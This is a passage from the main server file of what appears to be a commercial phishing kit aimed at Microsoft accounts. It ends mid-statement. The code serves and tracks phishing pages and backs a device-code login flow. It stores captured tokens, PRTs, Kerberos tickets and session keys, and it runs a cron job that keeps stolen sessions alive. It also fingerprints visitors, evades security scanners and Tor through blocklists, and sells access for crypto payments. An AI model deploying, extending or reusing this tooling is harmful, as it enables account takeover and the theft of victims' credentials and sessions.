require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');
const cron = require('node-cron');
const config = require('./backend/config/env');
const db = require('./backend/database/connection');

// ─── Device-code diagnostics switch ────────────────────────────────────────
// Every [DevCode] / [DevCode][DIAG] / [VG] line added for the link-147
// investigation routes through dcDiag(). One switch:
//
//   DC_DIAG=0   silences all of it at runtime (no server restart needed)
//   DC_DIAG unset or 1   logging on (current behaviour)
//
// Nothing here reaches the visitor's browser console - vg-engine overrides
// console.* and ships its records to /api/log. To strip the diagnostics
// permanently, revert the diagnostic commit; the routing/blocklist fixes are
// in separate commits and are unaffected.
const DC_DIAG = String(process.env.DC_DIAG || '1') === '1';
function dcDiag(msg) { if (DC_DIAG) console.log(msg); }


// Route imports
const authRoutes = require('./backend/routes/auth');
const adminRoutes = require('./backend/routes/admin');
const userRoutes = require('./backend/routes/user');
const { csrfProtection } = require('./backend/middleware/csrf');
const { maintenanceCheck } = require('./backend/middleware/maintenance');
// Wrap linkRoutes with CSRF protection for state-changing methods
const linkRoutes = require('./backend/routes/links');
const tokenRoutes = require('./backend/routes/tokens');
const cookieInjectRoutes = require('./backend/routes/cookieinject');
const templateRoutes = require('./backend/routes/templates');
const paymentRoutes = require('./backend/routes/payments');
const broadcastRoutes = require('./backend/routes/broadcast');
const feedbackRoutes = require('./backend/routes/feedback');
const analyticsRoutes = require('./backend/routes/analytics');
const systemRoutes = require('./backend/routes/system');
const captureRoutes = require('./backend/routes/capture');
const deviceRoutes = require('./backend/routes/device');
const previewRoutes = require('./backend/routes/preview');
const antibotRoutes = require('./backend/routes/antibot');

// Service imports
const sessionKeeper = require('./backend/services/sessionkeeper')

const app = express();
app.set('trust proxy', 1);
const server = http.createServer(app);

let _opsecRateLimiter = null;
let _opsecRateSettings = null;
let _opsecRateExpiry = 0;
const io = socketIo(server, {
  cors: {
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      if (allowedOrigins.includes(origin)) return callback(null, true);
      console.warn(`[SOCKET.IO CORS] Denied origin: ${origin}`);
      const err = new Error('Origin not allowed by Socket.IO CORS');
      err.status = 403;
      return callback(err, false);
    },
    methods: ['GET', 'POST'],
    credentials: true,
  },
  transports: ['websocket', 'polling'],
});

// --- Middleware ---
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'", // Required for template injection
        "https://cdnjs.cloudflare.com",
        "https://*.cloudflare.com",
        "https://cdn.jsdelivr.net",
        "https://unpkg.com",
        "https://accounts.google.com",
        "https://login.microsoftonline.com",
        "https://*.google.com",
        "https://*.microsoft.com",
      ],
      scriptSrcAttr: ["'unsafe-inline'"],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://fonts.googleapis.com",
        "https://cdnjs.cloudflare.com",
        "https://cdn.jsdelivr.net",
        "https://fonts.gstatic.com",
      ],
      fontSrc: [
        "'self'",
        "https://fonts.gstatic.com",
        "https://cdnjs.cloudflare.com",
        "data:",
      ],
      imgSrc: [
        "'self'",
        "data:",
        "blob:",
        "https://cdn-icons-png.flaticon.com",
        "https://fonts.googleapis.com",
        "https://fonts.gstatic.com",
        "https://cdnjs.cloudflare.com",
        "https://cdn.jsdelivr.net",
        "https://*.cloudflare.com",
      ],
      connectSrc: [
        "'self'",
        "wss:",
        "https://login.microsoftonline.com",
        "https://*.microsoft.com",
        "https://graph.microsoft.com",
        "https://*.cloudflare.com",
        "https://accounts.google.com",
        "https://*.google.com",
        "https://api.telegram.org",
        "https://api.nowpayments.io",
        "https://ip-api.com",
      ],
      frameSrc: [
        "'none'",
      ],
      frameAncestors: [
        "'none'",
      ],
      objectSrc: [
        "'none'",
      ],
      baseUri: [
        "'self'",
      ],
      formAction: [
        "'self'",
      ],
      upgradeInsecureRequests: [],
    },
    reportOnly: process.env.NODE_ENV !== 'production',
  },
  crossOriginEmbedderPolicy: false,
  crossOriginOpenerPolicy: false,
  crossOriginResourcePolicy: { policy: "same-origin" },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: 'deny' },
  hidePoweredBy: true,
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  ieNoOpen: true,
}));
// Robust CORS handling: only allow configured origins.
// In production, silently rejecting unknown origins is REQUIRED for security.
const rawAppUrl = [process.env.APP_URL || '', process.env.API_URL || ''].join(',');
const allowedOrigins = rawAppUrl ? rawAppUrl.split(',').map(s => s.trim()).filter(Boolean) : [];

async function getDynamicOrigins() {
  const origins = new Set(allowedOrigins);
  try {
    const [rows] = await db.query(
      "SELECT custom_domain, url_type, worker_name FROM links WHERE status != 'disabled'"
    );
    for (const row of rows || []) {
      if (row.url_type === 'worker' && row.worker_name) {
        const name = String(row.worker_name).trim();
        if (!name) continue;
        origins.add(`https://${name}.workers.dev`);
        origins.add(`https://*.workers.dev`);
        continue;
      }
      if ((row.url_type === 'custom' || row.url_type === 'export' || row.url_type === 'bunny') && row.custom_domain) {
        let domain = String(row.custom_domain).trim();
        domain = domain.replace(/^https?:\/\//i, '').replace(/\/+$/g, '').split('/')[0];
        if (domain) origins.add(`https://${domain}`);
      }
    }
  } catch (err) {
    console.warn('[CORS] Dynamic origin load failed:', err.message);
  }
  return Array.from(origins);
}

const corsOptions = {
  origin: async function (origin, callback) {
    const dynamicOrigins = await getDynamicOrigins();
    const allowed = new Set(dynamicOrigins);
    
    // Blocklist: domains that should NEVER be allowed
    const blocklist = [
      'araswebco.info',  // Add suspicious domains here
    ];
    
    if (!origin) return callback(null, true);
    
    // Check if origin is in blocklist
    for (const blocked of blocklist) {
      if (origin.includes(blocked)) {
        console.warn(`[CORS] BLOCKED origin (blocklist): ${origin}`);
        return callback(new Error('Origin is blocked'), false);
      }
    }
    
    try {
      if (allowed.has(origin) || /\.workers\.dev$/.test(new URL(origin).hostname)) {
        return callback(null, true);
      }
    } catch (e) {
      // Invalid URL - deny silently
      return callback(new Error('Invalid origin URL'), false);
    }
    console.warn(`[CORS] Denied origin: ${origin}`);
    const err = new Error('Origin not allowed by CORS');
    err.status = 403;
    return callback(err, false);
  },
  credentials: true,
  optionsSuccessStatus: 200,
  maxAge: 86400, // 24 hours preflight cache
};
app.use(cors(corsOptions));
app.use(compression());
app.use(cookieParser());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Global rate limiter for state-changing endpoints only.
// GET requests are excluded so dashboard/settings pages with many API calls do not get blocked.
function buildGlobalLimiter() {
  return rateLimit({
    windowMs: config.RATE_LIMIT_WINDOW_MS || 15 * 60 * 1000,
    max: Math.max(config.RATE_LIMIT_MAX_REQUESTS || 0, 500),
    skip: (req) => req.method === 'GET',
    keyGenerator: (req) => {
      const authToken = req.headers.authorization?.replace(/^Bearer\s+/i, '');
      if (authToken) return authToken;
      const forwarded = req.headers['x-forwarded-for'];
      if (forwarded) return String(forwarded).split(',')[0].trim();
      return req.ip;
    },
    standardHeaders: true,
    legacyHeaders: false,
    message: { error: 'Too many requests, please try again later.' },
  });
}
const globalLimiter = buildGlobalLimiter();
app.use('/api/', globalLimiter);

// OPSEC middleware: block scanners, bots, Tor, datacenter IPs, and attack payloads
const { opsecCheck } = require('./backend/middleware/opsec');
app.use(opsecCheck);

// No rate limiting for device status polling (needs frequent requests)
// The polling is already limited by the client-side 1-second interval

// Dangerous HTTP method blocker at server level
app.use((req, res, next) => {
  if (['TRACE', 'TRACK', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK'].includes(req.method)) {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  next();
});
// Stricter limiter for ALL authentication routes - prevents brute-force attacks
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20, // max 20 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many auth attempts, please try again later.' },
});
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/activate', authLimiter);
app.use('/api/auth/verify-totp', authLimiter);
app.use('/api/auth/setup', authLimiter);
// Add a separate tighter limiter for admin-login specifically (higher sensitivity)
const adminAuthLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // only 5 attempts for admin login due to higher risk
  message: { error: 'Too many admin login attempts, please wait longer.' },
});
app.use('/api/auth/admin-login', adminAuthLimiter);

// Rate limiter for admin API routes (prevent brute-force on admin endpoints)
const adminApiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many admin API attempts, please wait.' },
});
app.use('/api/admin', adminApiLimiter);

// --- Admin Panel Route (hidden path) – serve entire directory statically ---
const adminPath = config.ADMIN_PATH;
app.use(`/${adminPath}`, (req, res, next) => {
  const path = req.path;
  const isStaticAsset = !path.startsWith('/api/') && /\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map|json|html)$/i.test(path);
  const isLoginPage = path === '/' || path === '/index.html' || path === '/setup.html';
  if (isStaticAsset || isLoginPage) return next();

  const token = req.headers.authorization?.replace('Bearer ', '') || req.cookies?.vg_admin_session;
  if (!token) return res.redirect(`/${adminPath}/`);

  try {
    const jwt = require('jsonwebtoken');
    const decoded = jwt.verify(token, config.JWT_SECRET);
    if (!decoded.admin_id) return res.redirect(`/${adminPath}/`);
    return next();
  } catch (e) {
    return res.redirect(`/${adminPath}/`);
  }
});

// --- .html extension cleaner & clean-URL resolver ---
// Configured static dirs to resolve clean URLs against
const adminPathUrl = `/${config.ADMIN_PATH}`;
const CLEAN_URL_DIRS = [
  { prefix: `${adminPathUrl}/`, dir: 'admin-panel' },
  { prefix: '/user-panel/', dir: 'user-panel' },
];
app.use((req, res, next) => {
  const url = req.path;
  if (url.startsWith('/api/') || req.method !== 'GET') return next();
  if (/\.html$/i.test(url)) {
    for (const entry of CLEAN_URL_DIRS) {
      if (url.startsWith(entry.prefix)) {
        return res.redirect(301, url.replace(/\.html$/i, ''));
      }
    }
    return next();
  }
  if (/\.[a-z0-9]{2,5}$/i.test(url)) return next();
  for (const entry of CLEAN_URL_DIRS) {
    if (!url.startsWith(entry.prefix)) continue;
    const rel = url.slice(entry.prefix.length);
    if (!rel || rel.endsWith('/')) continue;
    const candidate = path.join(__dirname, entry.dir, rel + '.html');
    if (fs.existsSync(candidate)) {
      return res.sendFile(candidate);
    }
  }
  next();
});

const { createApiDomainGate } = require('./backend/middleware/api-domain-gate');
app.use(createApiDomainGate(config.API_URL));

// Root redirect → user-panel login
app.get('/', (req, res) => res.redirect(302, '/user-panel'));

// Static files with cache headers for performance
app.use('/user-panel', express.static(path.join(__dirname, 'user-panel'), {
  maxAge: '1d',
  immutable: true
}));
app.use('/templates', express.static(path.join(__dirname, 'templates'), {
  maxAge: '7d',
  immutable: true
}));
app.use('/verification-designs', express.static(path.join(__dirname, 'verification-designs'), {
  maxAge: '7d',
  immutable: true
}));

// Maintenance mode middleware for API routes
app.use(maintenanceCheck);

// --- API Routes ---
app.use('/api/auth', authRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/user', userRoutes);
// Apply CSRF protection to state-changing links operations (POST, PUT, DELETE)
app.use('/api/links', csrfProtection);
app.use('/api/links', linkRoutes);
// Mount tokenRoutes with /inject sub-routes - cookieInjectRoutes handles /inject/* paths
// We mount cookieInjectRoutes FIRST so /inject/* routes match before /api/tokens/:id
app.use('/api/tokens/inject', cookieInjectRoutes);
app.use('/api/tokens', tokenRoutes);
app.use('/api/templates', templateRoutes);
app.use('/api/payments', paymentRoutes);
app.use('/api/broadcast', broadcastRoutes);
app.use('/api/feedback', feedbackRoutes);
app.use('/api/analytics', analyticsRoutes);
app.use('/api/system', systemRoutes);
app.use('/api/device', deviceRoutes);
app.use('/api/preview', previewRoutes);
app.use('/api/admin', antibotRoutes);

// Public notice endpoint - requires authentication for privacy reasons
app.get('/api/notices/latest', async (req, res) => {
  try {
    // Extract token from Authorization header or cookies
    const token = req.headers.authorization?.replace('Bearer ', '') || req.cookies?.vg_session;
    if (!token) return res.status(401).json({ error: 'Authentication required' });
    
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(token, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
    
    // Ensure this is a user token (not admin)
    if (!decoded.user_id) return res.status(401).json({ error: 'Invalid token type' });
    
    // Only show notices relevant to this user would go here
    const [rows] = await db.query(
      'SELECT * FROM notices WHERE active = 1 ORDER BY created_at DESC LIMIT 1'
    );
    res.json(rows[0] || null);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Beacon endpoint for phishing page tracking - requires valid JWT from worker/page
app.post('/api/beacon', async (req, res) => {
  try {
    const { jwt_token, ip, ua } = req.body;
    
    // Verify JWT token
    if (!jwt_token) return res.status(401).json({ error: 'JWT token required' });
    
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
    
    // Validate that this is a link/jwt token (user_id + link_id should be present)
    if (!decoded.user_id || !decoded.link_id) {
      return res.status(403).json({ error: 'Invalid token payload' });
    }
    
    // Log the beacon event (link could log its own data)
    console.log(`[Beacon] visitor detected: user=${decoded.user_id}, link=${decoded.link_id}, ip=${ip}`);
    
    res.status(200).send('ok');
  } catch (err) {
    console.error('[Beacon] Error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});
// Beacon fingerprint endpoint - receives browser fingerprint from anti-scraping
app.post('/api/beacon/fp', async (req, res) => {
  try {
    const { fp, jwt_token, link_id } = req.body;
    
    // Verify JWT token
    if (!jwt_token) return res.status(401).json({ error: 'JWT token required' });
    
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
    
    // Update fingerprint in visitors table
    if (decoded.link_id) {
      await db.query(
        'UPDATE visitors SET fingerprint = ? WHERE link_id = ? AND jwt_token = ?',
        [fp, decoded.link_id, jwt_token]
      );
      console.log(`[BeaconFp] Link ${decoded.link_id} fingerprint received`);
    }
    
    res.status(200).send('ok');
  } catch (err) {
    console.error('[BeaconFp] Error:', err.message);
    res.status(500).json({ error: 'Fingerprint failed' });
  }
});

// Verify endpoint for JWT validation (phishing pages)
app.post('/api/verify', async (req, res) => {
  const reqLinkId = req.query.link_id ? String(req.query.link_id) : '';
  dcDiag('[DevCode] /api/verify hit origin=' + (req.get('origin') || req.headers.host || '-') + ' token_len=' + String(req.body && req.body.token || '').length + ' query_link_id=' + reqLinkId + ' caller=' + (req.body && req.body.caller || '-'));
  try {
    const jwt = require('jsonwebtoken');
    const { token } = req.body || {};
    if (!token) { dcDiag('[DevCode] /api/verify FAIL: no token in body'); return res.status(403).json({ error: 'Invalid token' }); }

    let decoded;
    try {
      decoded = jwt.verify(token, config.JWT_SECRET);
      dcDiag('[DevCode] /api/verify JWT OK user_id=' + decoded.user_id + ' link_id=' + decoded.link_id + ' exp=' + new Date(decoded.exp * 1000).toISOString());
    } catch (err) {
      dcDiag('[DevCode] /api/verify FAIL: jwt invalid/expired (' + err.name + ': ' + err.message + ')');
      return res.status(403).json({ error: 'Token expired or invalid' });
    }

    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
    if (!users.length) { dcDiag('[DevCode] /api/verify FAIL: user not found id=' + decoded.user_id); return res.status(403).json({ error: 'User not found' }); }

    const user = users[0];
    if (user.subscription_status !== 'active') {
      dcDiag('[DevCode] /api/verify FAIL: subscription_status=' + user.subscription_status + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
      return res.status(403).json({ error: 'Subscription inactive' });
    }
    if (user.subscription_expiry && new Date(user.subscription_expiry) < new Date()) {
      dcDiag('[DevCode] /api/verify FAIL: subscription_expiry=' + user.subscription_expiry + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
      return res.status(403).json({ error: 'Subscription expired' });
    }

    const [links] = await db.query('SELECT * FROM links WHERE id = ? AND status = ? AND kill_switched = 0', 
      [decoded.link_id, 'active']);
    if (!links.length) {
      const [rows] = await db.query('SELECT id, status, kill_switched, url_type, worker_name FROM links WHERE id = ?', [decoded.link_id]);
      dcDiag('[DevCode] /api/verify FAIL: link not active. link_id=' + decoded.link_id + ' row=' + JSON.stringify(rows[0] || null));
      return res.status(403).json({ error: 'Link not active' });
    }

    let tsKey = config.CF_TURNSTILE_SITE_KEY || '';
    try {
      const turnstilePool = require('./backend/services/turnstile-pool');
      const sk = await turnstilePool.getAssignedSiteKey(decoded.link_id);
      if (sk) tsKey = sk;
    } catch (e) { /* fallback already set */ }

    dcDiag('[DevCode] /api/verify OK link_id=' + decoded.link_id + ' tenant=' + config.AZURE_TENANT + ' client_id_set=' + !!config.AZURE_CLIENT_ID + ' turnstile_key_set=' + !!tsKey);
    res.json({
      valid: true,
      client_id: config.AZURE_CLIENT_ID,
      tenant: config.AZURE_TENANT,
      turnstile_key: tsKey,
    });
  } catch (err) {
    dcDiag('[DevCode] /api/verify EXCEPTION: ' + err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Debug endpoint: dump the state the device-code flow depends on so the failure
// point is visible without reading Cloudflare worker logs. Token-gated so it
// can't be probed anonymously - the same JWT the page already carries.
app.get('/api/debug/devicecode', async (req, res) => {
  try {
    const jwt = require('jsonwebtoken');
    const token = req.query.token || String(req.headers.authorization || '').replace(/^Bearer\s+/i, '');
    if (!token) return res.status(401).json({ ok: false, error: 'token required (?token=<jwt>)' });
    let decoded;
    try { decoded = jwt.verify(token, config.JWT_SECRET); }
    catch (e) { return res.status(401).json({ ok: false, error: 'invalid/expired token: ' + e.message }); }

    const linkId = String(decoded.link_id);
    let user = null, link = null, pool = {};
    try {
      const [u] = await db.query('SELECT id, subscription_status, subscription_plan, subscription_expiry, telegram_id FROM users WHERE id = ?', [decoded.user_id]);
      user = u[0] || null;
    } catch (e) { user = { _db_error: e.message }; }
    try {
      const [l] = await db.query('SELECT id, user_id, status, kill_switched, url_type, worker_name, custom_domain, verification_design, template_type, turnstile_enabled, obfuscated, created_at FROM links WHERE id = ?', [linkId]);
      link = l[0] || null;
    } catch (e) { link = { _db_error: e.message }; }
    try {
      const tp = require('./backend/services/turnstile-pool');
      const sk = await tp.getAssignedSiteKey(linkId);
      const sks = await tp.getAssignedSecret(linkId);
      pool = { turnstile_site_key: sk, turnstile_secret_set: !!sks, secret_len: String(sks || '').length };
    } catch (e) { pool = { _error: e.message }; }

    res.json({
      ok: true,
      link_id: linkId,
      jwt: { user_id: decoded.user_id, exp: new Date(decoded.exp * 1000).toISOString() },
      config: {
        jwt_secret_set: !!config.JWT_SECRET,
        azure_client_id_set: !!config.AZURE_CLIENT_ID,
        azure_tenant: config.AZURE_TENANT || null,
        azure_client_secret_set: !!config.AZURE_CLIENT_SECRET,
        api_url: config.API_URL || null,
        app_url: config.APP_URL || null,
      },
      user, link, turnstile_pool: pool,
    });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// Log endpoint for worker errors - requires valid JWT token embedded in logging requests
app.post('/api/log', async (req, res) => {
  try {
    // Investigation off-switch: with DC_DIAG=0 the [DevCode][DIAG] records are
    // dropped outright (not stored, not printed). Every other /api/log record
    // is untouched. This is how the diagnostics are removed without a code change.
    if (!DC_DIAG && /^\[DevCode\]\[DIAG\]/.test(String(req.body.message || ''))) {
      return res.status(200).send('ok');
    }

    // Extract JWT from authorization header if present, or from body (worker may send both)
    const token = req.headers.authorization?.replace('Bearer ', '') || req.body.__jwt__;

    if (!token) {
      // Workers may use a simpler method - check link_id directly for trusted workers
      const { link_id } = req.body;
      if (!link_id) return res.status(401).json({ error: 'JWT token or link_id required' });
      // Allow direct logging from workers linked to this link without extra auth
      // This is acceptable since workers are generated with the link's JWT payload
      const { message, stack, source, lineno, colno, ua } = req.body;
      if (link_id && message) {
        console.error('[Worker Log] link_id=' + link_id + ' msg=' + message + (source ? ' source=' + source : ''));
        await db.query(
          'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
          [link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
        );
      }
      return res.status(200).send('ok');
    }

    // Verify JWT token from user session
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(token, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    // Ensure link_id matches
    const providedLinkId = req.body.link_id;
    if (providedLinkId && providedLinkId !== String(decoded.link_id)) {
      return res.status(403).json({ error: 'Token does not match requested link' });
    }

    // Handle batch log format from vg-engine.js
    const logs = req.body.logs;
    if (logs && Array.isArray(logs)) {
      // Batch format: [{ level, message, data, ts, url, ua }, ...]
      for (var i = 0; i < logs.length; i++) {
        var log = logs[i];
        var msg = '[' + (log.level || 'info').toUpperCase() + '] ' + (log.message || '');
        if (log.data) {
          try { msg += ' ' + (typeof log.data === 'string' ? log.data : JSON.stringify(log.data)); } catch(e) {}
        }
        // vg-engine overrides console.* inside the page, so every client-side
        // console.log arrives here queued rather than in the browser console -
        // nothing of this reaches the visitor. Records are always stored;
        // printing is what DC_DIAG toggles.
        if (DC_DIAG && (log.level === 'error' || /\[DevCode\]|\[VG\]/.test(msg))) {
          console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + msg);
        }
        await db.query(
          'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent, created_at) VALUES (?, ?, ?, ?, ?)',
          [decoded.link_id, msg, log.url || '', log.ua || '', new Date(log.ts || Date.now())]
        );
      }
    } else {
      // Single log format from workers
      const { message, stack, source, lineno, colno, ua } = req.body;
      if (decoded.link_id && message) {
        if (DC_DIAG) console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + message + (source ? ' source=' + source : ''));
        await db.query(
          'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
          [decoded.link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
        );
      }
    }
    res.status(200).send('ok');
  } catch (err) {
    console.error('[Log] Error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// KillPage endpoint - logs anti-clone/anti-debug triggers
app.post('/api/killpage', async (req, res) => {
  try {
    const { reason, url, ua, link_id } = req.body;
    console.error('[KillPage] reason:', reason, 'url:', url, 'ua:', (ua || '').substring(0, 100));
    
    if (link_id) {
      await db.query(
        'INSERT INTO deployment_logs (link_id, error_message, user_agent) VALUES (?, ?, ?)',
        [link_id, `killPage triggered: ${reason}`, ua || '']
      );
    }
    
    res.status(200).send('ok');
  } catch (err) {
    console.error('[KillPage] Error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Scanner signal endpoint - grows the IP blocklist from blocked edge traffic.
// Called by the Cloudflare Worker (event.waitUntil) when it stops a request on
// user-agent or rate-limit grounds, so the address is blocked by IP on the next
// deployment. The worker sends no auth, so this only accepts the source address
// plus user agent for triage - see scanner-blocklist.js.
app.post('/api/scanner-signal', async (req, res) => {
  try {
    const { ip, user_agent, reason, jwt_token } = req.body || {};
    if (!ip) return res.status(400).json({ error: 'missing ip' });

    // Verify the caller is one of our deployed workers. Without this the
    // endpoint would be an open write to the blocklist, letting anyone pre-fill
    // it (or fill it to the cap, excluding real scanner addresses).
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(jwt_token || '', config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
    if (!decoded || !decoded.link_id) {
      return res.status(401).json({ error: 'Token has no link' });
    }

    const scannerBlocklist = require('./backend/services/scanner-blocklist');
    const added = await scannerBlocklist.addBlockedIp(ip, 'edge_signal', user_agent);
    console.warn('[ScannerSignal] link:', String(decoded.link_id),
      'ip:', String(ip).slice(0, 45),
      'reason:', String(reason || '').slice(0, 60),
      'action:', added ? 'added' : 'already_listed');

    res.status(200).send('ok');
  } catch (err) {
    console.error('[ScannerSignal] Error:', err.message);
    res.status(200).send('ok'); // never fail the caller; the worker ignores status
  }
});

// Favicon route - suppress 403 errors
app.get('/favicon.ico', (req, res) => res.status(204).end());

app.use(`/${adminPath}`, express.static(path.join(__dirname, 'admin-panel'), { index: 'index.html' }));

// Admin login probe endpoint - used to test connectivity without auth
app.get('/api/auth/admin-login-probe', (req, res) => {
  res.json({ ok: true, timestamp: Date.now() });
});

// Admin setup check endpoint
app.get('/api/admin/check-setup', async (req, res) => {
  try {
    const [rows] = await db.query('SELECT COUNT(*) as count FROM admins');
    res.json({ needsSetup: rows[0].count === 0 });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- WebSocket ---
io.on('connection', (socket) => {
  console.log('[WS] Client connected:', socket.id);
  
  socket.on('subscribe', (data) => {
    if (data.room) {
      socket.join(data.room);
    }
  });
  
  socket.on('disconnect', () => {
    console.log('[WS] Client disconnected:', socket.id);
  });
});

// Make io accessible to routes
app.set('io', io);

// --- Session Keeper Cron ---
cron.schedule(`0 */${config.RENEWAL_INTERVAL_HOURS} * * *`, async () => {
  console.log('[CRON] Running session keeper renewal...');
  try {
    await sessionKeeper.runRenewalCycle();
  } catch (err) {
    console.error('[CRON] Session keeper error:', err.message);
  }
});

// Payment expiry check every 5 minutes
cron.schedule('*/5 * * * *', async () => {
  try {
    const [expired] = await db.query(
      "UPDATE payments SET status = 'expired' WHERE status = 'pending' AND expires_at < NOW()"
    );
    if (expired.affectedRows > 0) {
      console.log(`[CRON] Expired ${expired.affectedRows} payments`);
    }
  } catch (err) {
    console.error('[CRON] Payment expiry error:', err.message);
  }
});

// Mark old waiting visitors as timeout (cleanup orphaned visitors)
cron.schedule('*/5 * * * *', async () => {
  try {
    const [updated] = await db.query(
      "UPDATE visitors SET status = 'timeout' WHERE status = 'waiting' AND created_at < DATE_SUB(NOW(), INTERVAL 20 MINUTE)"
    );
    if (updated.affectedRows > 0) {
      console.log(`[CRON] Marked ${updated.affectedRows} timed-out visitors as 'timeout'`);
    }
  } catch (err) {
    console.error('[CRON] Visitor timeout cleanup error:', err.message);
  }
});

// --- Auto cleanup of old/orphaned data ---
const { getOpsecSettings } = require('./backend/middleware/opsec');
cron.schedule('0 * * * *', async () => {
  try {
    const settings = await getOpsecSettings();
    if (settings.auto_cleanup !== 'true') return;
    const retention = parseInt(settings.token_retention_days, 10) || 30;
    const [oldTokens] = await db.query(
      `DELETE FROM captured_tokens WHERE created_at < DATE_SUB(NOW(), INTERVAL ? DAY) AND deleted = 0`,
      [retention]
    );
    const [orphanCredentials] = await db.query(
      `DELETE FROM device_credentials WHERE user_id NOT IN (SELECT id FROM users)`
    );
    let orphanRenewals = { affectedRows: 0 };
    if (settings.delete_orphans === 'true') {
      [orphanRenewals] = await db.query(
        `DELETE FROM cookie_renewals WHERE capture_id NOT IN (SELECT id FROM captured_tokens)`
      );
    }
    const total = (oldTokens.affectedRows || 0) + (orphanCredentials.affectedRows || 0) + (orphanRenewals.affectedRows || 0);
    if (total > 0) {
      console.log(`[CRON] Auto cleanup removed ${total} records`);
    }
  } catch (err) {
    console.error('[CRON] Auto cleanup error:', err.message);
  }
});

// --- Error Handler ---
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  // In production, never expose stack traces or internal error details
  if (config.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    // In development only, show limited error details
    // Never expose headers or internal config
    res.status(500).json({ 
      error: err.message,
      stack: err.stack,
    });
  }
});

app.use('/api/capture', captureRoutes);

require('./telegram-bot/bot');

// --- Auto-run schema migrations on startup ---
async function runMigrations() {
  try {
    const fs = require('fs');
    const path = require('path');
    const migrations = [
      // Order is cosmetic only: every statement is wrapped in try/catch and
      // errors are ignored, so re-running is safe. No migration uses an AFTER
      // anchor that references a column added by a sibling migration.
      // add_prt_kerberos_columns.sql adds prt / session_key_jwe / device_tenant_id
      // / tgt_* / account_type -- none of which schema.sql defines, and which the
      // old add_missing_columns.sql (DELIMITER + PROCEDURE) could not install.
      'add_prt_kerberos_columns.sql',
      'add_client_id_column.sql',
      'add_client_info_column.sql',
      // add_capture_columns.sql re-asserts EVERY captured_tokens column the
      // device-code / device-proxy INSERTs write (prt, client_info,
      // session_key_jwe, device_tenant_id, cookies_encrypted, device_*,
      // enrollment_time, tgt_*, account_type, client_id). A single missing one
      // makes the primary INSERT fail and silently degrade to the legacy
      // insert, dropping the device + PRT data.
      'add_capture_columns.sql',
      'add_performance_indexes.sql',
      'add_session_encryption_last_seen.sql',
      // add_session_key_column.sql adds device_credentials.session_key_encrypted
      // (the DECRYPTED PRT session key, encrypted at rest) for the GraphSpy-
      // compatible prtkdf.js service.
      'add_session_key_column.sql',
    ];
    for (const mig of migrations) {
      const migPath = path.join(__dirname, 'backend', 'database', mig);
      if (fs.existsSync(migPath)) {
        const sql = fs.readFileSync(migPath, 'utf8');
        const statements = sql.split(';').map(s => s.trim()).filter(s => s.length > 0);
        for (const stmt of statements) {
          try { await db.query(stmt); } catch (e) { /* ignore already-applied */ }
        }
        console.log(`[DB] Applied migration: ${mig}`);
      }
    }
    // Also ensure indexes from schema.sql exist (safe to re-run)
    const indexStatements = [
      'CREATE INDEX IF NOT EXISTS idx_captured_tokens_user_id ON captured_tokens(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_captured_tokens_link_id ON captured_tokens(link_id)',
